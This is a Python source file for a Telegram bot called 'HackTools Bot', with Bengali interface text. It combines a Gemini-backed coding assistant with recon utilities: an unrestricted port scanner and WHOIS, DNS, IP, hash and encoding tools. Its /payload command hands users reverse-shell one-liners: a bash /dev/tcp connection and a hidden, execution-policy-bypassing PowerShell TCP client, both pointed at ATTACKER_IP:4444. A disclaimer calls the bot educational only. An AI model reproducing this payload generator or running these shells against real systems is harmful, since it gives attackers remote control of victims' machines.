import os
import socket
import hashlib
import base64
import codecs
import logging
import re
import aiohttp
import whois
import dns.resolver
from datetime import datetime
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes
)
import google.generativeai as genai
from dotenv import load_dotenv

load_dotenv()
TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
GEMINI_API_KEY = os.getenv("GEMINI_API_KEY")

# Gemini কনফিগ
genai.configure(api_key=GEMINI_API_KEY)
model = genai.GenerativeModel("gemini-2.5-flash")  # তুমি চাইলে gemini-1.5-pro ও ব্যবহার করতে পারো

logging.basicConfig(level=logging.INFO)

# ==================== ইউটিলিটি ====================
async def send_split_message(update: Update, text: str, parse_mode="Markdown"):
    MAX_LENGTH = 4000
    if len(text) <= MAX_LENGTH:
        await update.message.reply_text(text, parse_mode=parse_mode)
    else:
        for i in range(0, len(text), MAX_LENGTH):
            await update.message.reply_text(text[i:i+MAX_LENGTH], parse_mode=parse_mode)

async def ask_ai(prompt: str) -> str:
    """Gemini API-তে প্রম্পট পাঠানো (নন-স্ট্রিম)"""
    try:
        # সিস্টেম ইনস্ট্রাকশন চ্যাট হিস্ট্রি দিয়ে দেওয়া
        chat = model.start_chat(history=[
            {
                "role": "user",
                "parts": ["তুমি একজন দক্ষ Python কোডিং অ্যাসিস্ট্যান্ট। সব উত্তর বাংলায় দেবে। প্রয়োজনে কোড ব্লক (```python) ব্যবহার করবে।"]
            },
            {
                "role": "model",
                "parts": ["ঠিক আছে, আমি বাংলায় Python কোডিং সহায়তা দেবো।"]
            }
        ])
        response = await chat.send_message_async(prompt)
        return response.text
    except Exception as e:
        return f"❌ Gemini API ত্রুটি: {str(e)}"

# ==================== AI কমান্ড ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "👋 *HackTools Bot (Gemini AI)* চালু!\n\n"
        "🧠 *AI ফিচার:*\n"
        "/write <কোড চাও>\n"
        "/review <কোড>\n"
        "সরাসরি মেসেজ দিলেও রিপ্লাই দেয়\n\n"
        "🛠️ *হ্যাকিং টুলস:*\n"
        "/scan <host> <start> <end>  — পোর্ট স্ক্যান\n"
        "/whois <domain>              — WHOIS তথ্য\n"
        "/dns <domain>                — DNS রেকর্ড\n"
        "/ipinfo <ip>                 — IP তথ্য\n"
        "/hash <text>                 — হ্যাশ ID + SHA256\n"
        "/encode <type> <text>        — এনকোড (base64/hex/url/rot13)\n"
        "/decode <type> <text>        — ডিকোড\n"
        "/payload <os>                — রিভার্স শেল পেলোড (শিক্ষা)\n\n"
        "❗ সব কিছু শুধু শিক্ষামূলক, অনুমতি ছাড়া ব্যবহার নয়।"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

async def write(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❗ কী কোড চাই বলো")
        return
    prompt = " ".join(context.args)
    msg = await update.message.reply_text("⏳ Gemini লিখছি...")
    answer = await ask_ai(f"এই অনুরোধ অনুযায়ী Python কোড দাও (শুধু কোড + সংক্ষিপ্ত ব্যাখ্যা):\n{prompt}")
    await msg.delete()
    await send_split_message(update, answer)

async def review(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❗ কোড দাও")
        return
    code = " ".join(context.args)
    msg = await update.message.reply_text("⏳ Gemini রিভিউ করছি...")
    answer = await ask_ai(f"নিচের কোড রিভিউ করো। Bug, Security issue, Improvement সহ বলো:\n{code}")
    await msg.delete()
    await send_split_message(update, answer)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    msg = await update.message.reply_text("⏳ Gemini ভাবছি...")
    answer = await ask_ai(text)
    await msg.delete()
    await send_split_message(update, answer)

# ==================== হ্যাকিং টুলস ====================
async def port_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 3:
        await update.message.reply_text("❗ /scan <target> <start_port> <end_port>")
        return
    host = context.args[0]
    try:
        start = int(context.args[1])
        end = int(context.args[2])
    except ValueError:
        await update.message.reply_text("❗ পোর্ট নাম্বার ঠিকমতো দাও")
        return
    if end > 65535 or start < 1:
        await update.message.reply_text("❗ পোর্ট 1-65535 এর মধ্যে হতে হবে")
        return
    await update.message.reply_text(f"⏳ {host}:{start}-{end} স্ক্যান করছি...")
    open_ports = []
    for port in range(start, end+1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    if open_ports:
        await update.message.reply_text(f"✅ খোলা পোর্ট: {', '.join(map(str, open_ports))}")
    else:
        await update.message.reply_text("❌ কোন খোলা পোর্ট পাওয়া যায়নি।")

async def whois_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❗ /whois <domain>")
        return
    domain = context.args[0]
    try:
        w = whois.whois(domain)
        text = f"*WHOIS for {domain}*\n"
        text += f"Registrar: {w.registrar}\n"
        text += f"Creation Date: {w.creation_date}\n"
        text += f"Expiration Date: {w.expiration_date}\n"
        text += f"Name Servers: {', '.join(w.name_servers) if w.name_servers else 'N/A'}\n"
        await send_split_message(update, text)
    except Exception as e:
        await update.message.reply_text(f"❌ ত্রুটি: {e}")

async def dns_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❗ /dns <domain>")
        return
    domain = context.args[0]
    try:
        answers = dns.resolver.resolve(domain, 'A')
        a_records = [str(r) for r in answers]
        mx_records = []
        try:
            mx = dns.resolver.resolve(domain, 'MX')
            mx_records = [str(r.exchange) for r in mx]
        except:
            pass
        text = f"*DNS for {domain}*\n"
        text += f"A: {', '.join(a_records)}\n"
        if mx_records:
            text += f"MX: {', '.join(mx_records)}\n"
        await update.message.reply_text(text, parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ DNS ত্রুটি: {e}")

async def ip_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❗ /ipinfo <ip>")
        return
    ip = context.args[0]
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://ipinfo.io/{ip}/json") as resp:
            if resp.status == 200:
                data = await resp.json()
                text = f"*IP Info:* {ip}\n"
                text += f"City: {data.get('city')}\n"
                text += f"Region: {data.get('region')}\n"
                text += f"Country: {data.get('country')}\n"
                text += f"ISP: {data.get('org')}\n"
                await update.message.reply_text(text, parse_mode="Markdown")
            else:
                await update.message.reply_text("❌ তথ্য পাওয়া যায়নি।")

async def hash_tool(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❗ /hash <text>")
        return
    text = " ".join(context.args).encode()
    md5 = hashlib.md5(text).hexdigest()
    sha1 = hashlib.sha1(text).hexdigest()
    sha256 = hashlib.sha256(text).hexdigest()
    res = f"*Hash of:* {text.decode()}\n"
    res += f"MD5: `{md5}`\n"
    res += f"SHA1: `{sha1}`\n"
    res += f"SHA256: `{sha256}`\n"
    await update.message.reply_text(res, parse_mode="Markdown")

async def encode_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("❗ /encode <type> <text>  (base64/hex/url/rot13)")
        return
    encoding = context.args[0].lower()
    text = " ".join(context.args[1:])
    try:
        if encoding == "base64":
            res = base64.b64encode(text.encode()).decode()
        elif encoding == "hex":
            res = text.encode().hex()
        elif encoding == "url":
            from urllib.parse import quote
            res = quote(text)
        elif encoding == "rot13":
            res = codecs.encode(text, 'rot_13')
        else:
            await update.message.reply_text("❌ অজানা টাইপ। base64, hex, url, rot13 ব্যবহার কর।")
            return
        await update.message.reply_text(f"`{res}`", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ ত্রুটি: {e}")

async def decode_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("❗ /decode <type> <text>")
        return
    decoding = context.args[0].lower()
    text = " ".join(context.args[1:])
    try:
        if decoding == "base64":
            res = base64.b64decode(text).decode()
        elif decoding == "hex":
            res = bytes.fromhex(text).decode()
        elif decoding == "url":
            from urllib.parse import unquote
            res = unquote(text)
        elif decoding == "rot13":
            res = codecs.decode(text, 'rot_13')
        else:
            await update.message.reply_text("❌ অজানা টাইপ")
            return
        await update.message.reply_text(f"`{res}`", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ ডিকোড ত্রুটি: {e}")

async def payload_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❗ /payload <os>  (linux/windows)")
        return
    os_type = context.args[0].lower()
    if os_type == "linux":
        payload = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
    elif os_type == "windows":
        payload = (
            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            "\"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);"
            "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){...}\""
        )
    else:
        await update.message.reply_text("❌ linux বা windows দাও")
        return
    await update.message.reply_text(
        f"*{os_type.upper()} রিভার্স শেল পেলোড (ATTACKER_IP/4444 বসাও):*\n`{payload}`",
        parse_mode="Markdown"
    )

# ==================== মেইন ====================
def main():
    if not TELEGRAM_TOKEN or not GEMINI_API_KEY:
        print("❌ TELEGRAM_BOT_TOKEN / GEMINI_API_KEY missing!")
        return
    app = Application.builder().token(TELEGRAM_TOKEN).build()

    # AI (Gemini)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("write", write))
    app.add_handler(CommandHandler("review", review))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Hacking tools
    app.add_handler(CommandHandler("scan", port_scan))
    app.add_handler(CommandHandler("whois", whois_lookup))
    app.add_handler(CommandHandler("dns", dns_lookup))
    app.add_handler(CommandHandler("ipinfo", ip_info))
    app.add_handler(CommandHandler("hash", hash_tool))
    app.add_handler(CommandHandler("encode", encode_text))
    app.add_handler(CommandHandler("decode", decode_text))
    app.add_handler(CommandHandler("payload", payload_gen))

    print("✅ HackTools Bot (Gemini AI) চালু...")
    app.run_polling()

if __name__ == "__main__":
    main()
